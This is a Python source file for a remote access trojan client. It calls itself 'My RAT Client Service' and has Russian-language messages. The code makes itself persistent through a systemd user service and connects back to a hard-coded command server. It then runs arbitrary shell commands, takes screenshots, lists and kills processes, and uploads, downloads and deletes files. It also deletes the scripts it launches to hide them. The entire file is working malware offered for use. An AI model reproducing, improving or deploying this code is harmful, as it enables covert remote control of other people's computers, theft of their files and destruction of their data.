import socket
import subprocess
import os
import sys
import time
import re

SERVER_IP = "192.168.100.3"  # Установите IP сервера
SERVER_PORT = 5000
BUFFER_SIZE = 4096


def execute_command(command):
    try:
        return subprocess.getoutput(command)
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"


def is_windows():
    return os.name == 'nt'


def add_self_to_autostart():
    systemd_dir = os.path.expanduser("~/.config/systemd/user")
    if not os.path.exists(systemd_dir):
        os.makedirs(systemd_dir)

    service_name = "myratclient.service"
    service_path = os.path.join(systemd_dir, service_name)

    exec_path = os.path.abspath(sys.argv[0])
    python_path = sys.executable

    service_content = f"""[Unit]
Description=My RAT Client Service
After=network.target

[Service]
Type=simple
ExecStart={python_path} {exec_path}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""

    with open(service_path, "w") as f:
        f.write(service_content)

    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "--user", "enable", service_name], check=True)
    subprocess.run(["systemctl", "--user", "start", service_name], check=True)

    print(f"[INFO] Автозапуск через systemd установлен: {service_path}")


def main():
    try:
        add_self_to_autostart()
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")

    current_dir = os.getcwd()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[INFO] Подключились к серверу {SERVER_IP}:{SERVER_PORT}")
        except Exception:
            print("[WARN] Не удалось подключиться к серверу. Пауза 5 секунд...")
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                command = data.decode(errors='ignore')
                if not command:
                    break
                if command == "exit":
                    break

                if command.startswith("cmd:"):
                    cmd = command[4:].strip()

                    # Запуск фоновых/nohup команд с удалением файла скрипта
                    if "nohup" in cmd or cmd.endswith('&'):
                        try:
                            m = re.search(r'python3\s+"([^"]+)"', cmd)
                            if m:
                                script_path = m.group(1)
                                script_dir = os.path.dirname(script_path)
                                log_file = os.path.join(script_dir, "asda.log")
                                run_cmd = (
                                    f'setsid python3 "{script_path}" > "{log_file}" 2>&1 < /dev/null &'
                                )
                            else:
                                script_dir = os.getcwd()
                                log_file = os.path.join(script_dir, "asda.log")
                                run_cmd = f'setsid {cmd} > "{log_file}" 2>&1 < /dev/null &'

                            subprocess.Popen(
                                run_cmd,
                                shell=True,
                                cwd=script_dir
                            )

                            # Удаляем файл скрипта сразу после запуска процесса
                            if m:
                                try:
                                    os.remove(script_path)
                                except Exception:
                                    pass

                            s.send("Команда запущена через setsid с логированием и скрипт удалён.".encode())
                        except Exception as e:
                            s.send(f"Ошибка запуска команды с setsid: {e}".encode())
                        continue

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            s.send(f"Сменена директория на {current_dir}".encode())
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode())

                    elif cmd.startswith("ls"):
                        path = cmd[2:].strip()
                        if not path or path == "~":
                            path = os.path.expanduser("~")
                        try:
                            entries = os.listdir(path)
                            dirs = []
                            files = []
                            for e in entries:
                                full_path = os.path.join(path, e)
                                if os.path.isdir(full_path):
                                    dirs.append(e + '/')
                                else:
                                    files.append(e)
                            result = "\n".join(sorted(dirs) + sorted(files))
                            s.send(result.encode())
                        except Exception:
                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode())

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode())

                elif command == "process_list":
                    if is_windows():
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode())

                elif command.startswith("kill:"):
                    pid = command[5:]
                    try:
                        if is_windows():
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode())

                elif command == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f_img:
                            while True:
                                chunk = f_img.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode())

                elif command.startswith("download:"):
                    filepath = command[len("download:"):].strip()
                    try:
                        filesize = os.path.getsize(filepath)
                        s.sendall(filesize.to_bytes(8, byteorder='big'))
                        with open(filepath, "rb") as f:
                            while True:
                                chunk = f.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                    except Exception as e:
                        error_msg = f"Ошибка при чтении файла: {e}"
                        err_bytes = error_msg.encode()
                        s.sendall(len(err_bytes).to_bytes(8, byteorder='big'))
                        s.sendall(err_bytes)

                elif command.startswith("upload:"):
                    filepath = command[len("upload:"):].strip()
                    try:
                        filesize_bytes = s.recv(8)
                        if len(filesize_bytes) < 8:
                            s.send("Ошибка: не удалось получить размер файла".encode())
                            continue
                        filesize = int.from_bytes(filesize_bytes, byteorder='big')

                        with open(filepath, "wb") as f:
                            received = 0
                            while received < filesize:
                                chunk = s.recv(min(BUFFER_SIZE, filesize - received))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received += len(chunk)

                        if received == filesize:
                            s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
                            print(f"[INFO] Файл {filepath} успешно сохранён")
                        else:
                            s.send(f"Ошибка: получено {received} байт, ожидалось {filesize}".encode())

                    except Exception as e:
                        s.send(f"Ошибка при сохранении файла: {e}".encode())
                        print(f"[ERROR] Ошибка при сохранении файла: {e}")

                elif command.startswith("delete:"):
                    filepath = command[len("delete:"):].strip()
                    try:
                        os.remove(filepath)
                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка удаления файла: {e}".encode())

                else:
                    s.send("Неизвестная команда".encode())

        except Exception as e:
            print(f"[ERROR] Ошибка в основном цикле: {e}")
        finally:
            s.close()

        time.sleep(5)


if __name__ == "__main__":
    main()
